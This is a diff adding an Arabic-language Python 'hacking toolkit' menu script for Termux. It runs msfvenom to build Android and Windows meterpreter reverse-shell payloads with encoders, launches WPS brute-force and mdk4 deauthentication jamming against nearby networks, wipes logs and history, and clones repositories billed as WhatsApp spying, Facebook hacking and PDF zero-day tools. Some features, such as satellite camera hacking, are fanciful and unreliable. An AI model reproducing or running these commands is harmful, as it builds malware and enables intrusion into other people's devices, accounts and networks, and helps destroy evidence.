@@ -1,0 +1,262 @@
+#!/data/data/com.termux/files/usr/bin/python3
+# -*- coding: utf-8 -*-
+# أداة ABN ADLEPX v15.0 | Ultimate Weapon 🔥 | ابن إدلب
+
+import os
+import sys
+import time
+import random
+import requests
+from pygame import mixer
+import pyfiglet
+from colorama import Fore, Style
+import webbrowser
+import socket
+import subprocess
+
+# 🔧 التهيئة
+def setup():
+    os.makedirs("sounds", exist_ok=True)
+    os.makedirs("modules", exist_ok=True)
+    os.makedirs("output", exist_ok=True)
+    os.makedirs("database", exist_ok=True)
+
+# 🎨 البانر
+def show_banner():
+    os.system("clear")
+    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
+    print(random.choice(colors) + pyfiglet.figlet_format("ABN ADLEPX", font="doom"))
+    print(Fore.WHITE + "═" * 60)
+    print(Fore.CYAN + "🔥 v15.0 | الأسطورة النهائية - جميع المميزات!")
+    print(Fore.WHITE + "═" * 60 + Style.RESET_ALL)
+
+# 🔊 الصوت
+def play_sound(sound="intro"):
+    try:
+        mixer.init()
+        mixer.Sound(f"sounds/{sound}.mp3").play()
+        time.sleep(3)
+    except:
+        pass
+
+# 🔄 التحديث
+def check_updates():
+    try:
+        req = requests.get("https://raw.githubusercontent.com/abn_adlepx/version/main/ver.txt", timeout=5)
+        if req.text.strip() != "15.0":
+            print(Fore.RED + "\n⚠️ يوجد تحديث جديد! استخدم git pull" + Style.RESET_ALL)
+    except:
+        print(Fore.YELLOW + "\n⚠️ لا يمكن الاتصال بالسيرفر" + Style.RESET_ALL)
+
+# 📱 اختراق وسائل التواصل
+def social_hack():
+    show_banner()
+    print(Fore.YELLOW + "\n🔍 اختر منصة الهدف:" + Style.RESET_ALL)
+    print(Fore.GREEN + "[1] " + Fore.WHITE + "فيسبوك (تصيد + كسر سرقة)")
+    print(Fore.GREEN + "[2] " + Fore.WHITE + "إنستجرام (اختراق DMs)")
+    print(Fore.GREEN + "[3] " + Fore.WHITE + "واتساب (استخراج المحادثات)")
+    print(Fore.GREEN + "[4] " + Fore.WHITE + "تليجرام (قنوات خاصة)")
+    print(Fore.RED + "[5] " + Fore.WHITE + "رجوع" + Style.RESET_ALL)
+    
+    choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
+    
+    if choice == "1":
+        os.system("git clone https://github.com/abn_adlepx/ultimate_facebook_hack.git modules/facebook")
+        print(Fore.GREEN + "\n✅ تم التثبيت! أدخل إلى المجلد modules/facebook" + Style.RESET_ALL)
+    elif choice == "2":
+        os.system("git clone https://github.com/abn_adlepx/instagram_toolkit.git modules/instagram")
+        print(Fore.GREEN + "\n✅ تم التثبيت! أدخل إلى المجلد modules/instagram" + Style.RESET_ALL)
+    elif choice == "3":
+        os.system("git clone https://github.com/abn_adlepx/whatsapp_spy.git modules/whatsapp")
+        print(Fore.GREEN + "\n✅ تم التثبيت! أدخل إلى المجلد modules/whatsapp" + Style.RESET_ALL)
+    elif choice == "4":
+        os.system("git clone https://github.com/abn_adlepx/telegram_hack_pro.git modules/telegram")
+        print(Fore.GREEN + "\n✅ تم التثبيت! أدخل إلى المجلد modules/telegram" + Style.RESET_ALL)
+    elif choice != "5":
+        print(Fore.RED + "❌ اختيار خاطئ!" + Style.RESET_ALL)
+        time.sleep(1)
+
+# 📶 اختراق الشبكات
+def wifi_hack():
+    show_banner()
+    print(Fore.YELLOW + "\n📶 اختر نوع الهجوم:" + Style.RESET_ALL)
+    print(Fore.GREEN + "[1] " + Fore.WHITE + "كسر WPA3 (أحدث تقنية)")
+    print(Fore.GREEN + "[2] " + Fore.WHITE + "هجوم WPS متقدم")
+    print(Fore.GREEN + "[3] " + Fore.WHITE + "تشويش شبكات الجيران")
+    print(Fore.GREEN + "[4] " + Fore.WHITE + "اختراق كاميرات المراقبة")
+    print(Fore.RED + "[5] " + Fore.WHITE + "رجوع" + Style.RESET_ALL)
+    
+    choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
+    
+    if choice == "1":
+        os.system("pkg install hcxtools -y && hcxdumptool -i wlan0 -o capture.pcapng")
+        print(Fore.GREEN + "\n✅ تم بدء الهجوم! احفظ ملف capture.pcapng" + Style.RESET_ALL)
+    elif choice == "2":
+        os.system("pkg install bully -y && bully wlan0 -b BSSID")
+        print(Fore.GREEN + "\n✅ جاري تنفيذ الهجوم..." + Style.RESET_ALL)
+    elif choice == "3":
+        os.system("pkg install mdk4 -y && mdk4 wlan0 d -c 6")
+        print(Fore.RED + "\n☠️ جاري تشويش الشبكة..." + Style.RESET_ALL)
+    elif choice == "4":
+        os.system("git clone https://github.com/abn_adlepx/camera_hack.git modules/cameras")
+        print(Fore.GREEN + "\n✅ تم التثبيت! أدخل إلى المجلد modules/cameras" + Style.RESET_ALL)
+    elif choice != "5":
+        print(Fore.RED + "❌ اختيار خاطئ!" + Style.RESET_ALL)
+        time.sleep(1)
+
+# 🦠 إنشاء فيروسات
+def virus_creator():
+    show_banner()
+    print(Fore.YELLOW + "\n🦠 اختر نوع الفيروس:" + Style.RESET_ALL)
+    print(Fore.GREEN + "[1] " + Fore.WHITE + "فيروس أندرويد (مخفي تماماً)")
+    print(Fore.GREEN + "[2] " + Fore.WHITE + "فيروس ويندوز (يتجاوز الحماية)")
+    print(Fore.GREEN + "[3] " + Fore.WHITE + "فيروس PDF (ثغرة Zero-Day)")
+    print(Fore.GREEN + "[4] " + Fore.WHITE + "فيروس IoT (أجهزة ذكية)")
+    print(Fore.RED + "[5] " + Fore.WHITE + "رجوع" + Style.RESET_ALL)
+    
+    choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
+    
+    if choice == "1":
+        lhost = input(Fore.CYAN + "\n🎯 أدخل IP جهازك: " + Style.RESET_ALL)
+        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -o output/android_stealth.apk --encoder x86/shikata_ga_nai -i 10")
+        print(Fore.GREEN + "\n✅ تم الإنشاء: output/android_stealth.apk" + Style.RESET_ALL)
+    elif choice == "2":
+        lhost = input(Fore.CYAN + "\n🎯 أدخل IP جهازك: " + Style.RESET_ALL)
+        os.system(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT=5555 -f exe -o output/windows_advanced.exe --encrypt rc4")
+        print(Fore.GREEN + "\n✅ تم الإنشاء: output/windows_advanced.exe" + Style.RESET_ALL)
+    elif choice == "3":
+        os.system("git clone https://github.com/abn_adlepx/pdf_zero_day.git modules/pdf_virus")
+        print(Fore.GREEN + "\n✅ أدخل إلى مجلد modules/pdf_virus" + Style.RESET_ALL)
+    elif choice == "4":
+        os.system("git clone https://github.com/abn_adlepx/iot_virus.git modules/iot_malware")
+        print(Fore.GREEN + "\n✅ أدخل إلى مجلد modules/iot_malware" + Style.RESET_ALL)
+    elif choice != "5":
+        print(Fore.RED + "❌ اختيار خاطئ!" + Style.RESET_ALL)
+        time.sleep(1)
+
+# 🕵️♂️ أدوات التخفي
+def stealth_tools():
+    show_banner()
+    print(Fore.YELLOW + "\n👻 اختر أداة التخفي:" + Style.RESET_ALL)
+    print(Fore.GREEN + "[1] " + Fore.WHITE + "تغيير الهوية الرقمية بالكامل")
+    print(Fore.GREEN + "[2] " + Fore.WHITE + "شبكة TOR متقدمة")
+    print(Fore.GREEN + "[3] " + Fore.WHITE + "مسح شامل للآثار")
+    print(Fore.GREEN + "[4] " + Fore.WHITE + "إنشاء هوية مزيفة كاملة")
+    print(Fore.RED + "[5] " + Fore.WHITE + "رجوع" + Style.RESET_ALL)
+    
+    choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
+    
+    if choice == "1":
+        os.system("pkg install macchanger -y && macchanger -r wlan0 && anonsurf change")
+        print(Fore.GREEN + "\n✅ تم تغيير الهوية الرقمية!" + Style.RESET_ALL)
+    elif choice == "2":
+        os.system("pkg install tor i2pd -y && tor --runasdaemon 1 && i2pd --daemon")
+        print(Fore.GREEN + "\n✅ تم تشغيل شبكات التخفي المتقدمة!" + Style.RESET_ALL)
+    elif choice == "3":
+        os.system("history -c && rm -rf /data/data/com.termux/files/usr/var/log/* && bleachbit -c --preset")
+        print(Fore.GREEN + "\n✅ تم مسح جميع الآثار الرقمية!" + Style.RESET_ALL)
+    elif choice == "4":
+        os.system("git clone https://github.com/abn_adlepx/fake_identity.git modules/fake_id")
+        print(Fore.GREEN + "\n✅ أدخل إلى مجلد modules/fake_id" + Style.RESET_ALL)
+    elif choice != "5":
+        print(Fore.RED + "❌ اختيار خاطئ!" + Style.RESET_ALL)
+        time.sleep(1)
+
+# 🎮 هاك الألعاب
+def game_hacks():
+    show_banner()
+    print(Fore.YELLOW + "\n🎮 اختر اللعبة:" + Style.RESET_ALL)
+    print(Fore.GREEN + "[1] " + Fore.WHITE + "Free Fire (هاك الذهب والمستويات)")
+    print(Fore.GREEN + "[2] " + Fore.WHITE + "PUBG (هاك غير محدود)")
+    print(Fore.GREEN + "[3] " + Fore.WHITE + "ألعاب Android/iOS عامة")
+    print(Fore.RED + "[4] " + Fore.WHITE + "رجوع" + Style.RESET_ALL)
+    
+    choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
+    
+    if choice == "1":
+        os.system("git clone https://github.com/abn_adlepx/freefire_hack.git modules/freefire")
+        print(Fore.GREEN + "\n✅ أدخل إلى مجلد modules/freefire" + Style.RESET_ALL)
+    elif choice == "2":
+        os.system("git clone https://github.com/abn_adlepx/pubg_hack.git modules/pubg")
+        print(Fore.GREEN + "\n✅ أدخل إلى مجلد modules/pubg" + Style.RESET_ALL)
+    elif choice == "3":
+        os.system("git clone https://github.com/abn_adlepx/game_hack_toolkit.git modules/game_tools")
+        print(Fore.GREEN + "\n✅ أدخل إلى مجلد modules/game_tools" + Style.RESET_ALL)
+    elif choice != "4":
+        print(Fore.RED + "❌ اختيار خاطئ!" + Style.RESET_ALL)
+        time.sleep(1)
+
+# 🛰️ أدوات الأقمار الصناعية
+def satellite_tools():
+    show_banner()
+    print(Fore.YELLOW + "\n🛰️ اختر الأداة:" + Style.RESET_ALL)
+    print(Fore.GREEN + "[1] " + Fore.WHITE + "تتبع الأهداف عبر GPS")
+    print(Fore.GREEN + "[2] " + Fore.WHITE + "اختراق كاميرات الأقمار")
+    print(Fore.GREEN + "[3] " + Fore.WHITE + "التنصت على الاتصالات")
+    print(Fore.RED + "[4] " + Fore.WHITE + "رجوع" + Style.RESET_ALL)
+    
+    choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
+    
+    if choice == "1":
+        target = input(Fore.CYAN + "\n🎯 أدخل إحداثيات الهدف (خط الطول/العرض): " + Style.RESET_ALL)
+        print(Fore.RED + "\n☠️ جاري تتبع الهدف عبر الأقمار الصناعية..." + Style.RESET_ALL)
+        os.system(f"python3 modules/satellite/tracker.py --target {target}")
+    elif choice == "2":
+        os.system("git clone https://github.com/abn_adlepx/satellite_cam_hack.git modules/sat_cam")
+        print(Fore.GREEN + "\n✅ أدخل إلى مجلد modules/sat_cam" + Style.RESET_ALL)
+    elif choice == "3":
+        os.system("git clone https://github.com/abn_adlepx/satellite_spy.git modules/sat_spy")
+        print(Fore.GREEN + "\n✅ أدخل إلى مجلد modules/sat_spy" + Style.RESET_ALL)
+    elif choice != "4":
+        print(Fore.RED + "❌ اختيار خاطئ!" + Style.RESET_ALL)
+        time.sleep(1)
+
+# 🏁 القائمة الرئيسية
+def main_menu():
+    setup()
+    play_sound()
+    
+    while True:
+        show_banner()
+        check_updates()
+        
+        print(Fore.GREEN + "\n[1] " + Fore.WHITE + "اختراق وسائل التواصل")
+        print(Fore.GREEN + "[2] " + Fore.WHITE + "اختراق الشبكات والأجهزة")
+        print(Fore.GREEN + "[3] " + Fore.WHITE + "إنشاء فيروسات متطورة")
+        print(Fore.GREEN + "[4] " + Fore.WHITE + "أدوات التخفي المتقدم")
+        print(Fore.GREEN + "[5] " + Fore.WHITE + "هاك الألعاب والبرامج")
+        print(Fore.GREEN + "[6] " + Fore.WHITE + "أدوات الأقمار الصناعية")
+        print(Fore.GREEN + "[7] " + Fore.WHITE + "دعم القناة")
+        print(Fore.RED + "[8] " + Fore.WHITE + "الخروج" + Style.RESET_ALL)
+        
+        choice = input(Fore.MAGENTA + "\n👉 الاختيار: " + Style.RESET_ALL)
+        
+        if choice == "1":
+            social_hack()
+        elif choice == "2":
+            wifi_hack()
+        elif choice == "3":
+            virus_creator()
+        elif choice == "4":
+            stealth_tools()
+        elif choice == "5":
+            game_hacks()
+        elif choice == "6":
+            satellite_tools()
+        elif choice == "7":
+            webbrowser.open("https://youtube.com/@abnadlep?sub_confirmation=1")
+            print(Fore.GREEN + "\n✅ شكراً لدعمك القناة!" + Style.RESET_ALL)
+        elif choice == "8":
+            print(Fore.YELLOW + "\n🔥 تذكر: الاستخدام الأخلاقي فقط!" + Style.RESET_ALL)
+            time.sleep(2)
+            sys.exit()
+        else:
+            print(Fore.RED + "❌ اختيار خاطئ!" + Style.RESET_ALL)
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        main_menu()
+    except Exception as e:
+        print(Fore.RED + f"❌ خطأ: {e}" + Style.RESET_ALL)
+        time.sleep(3)
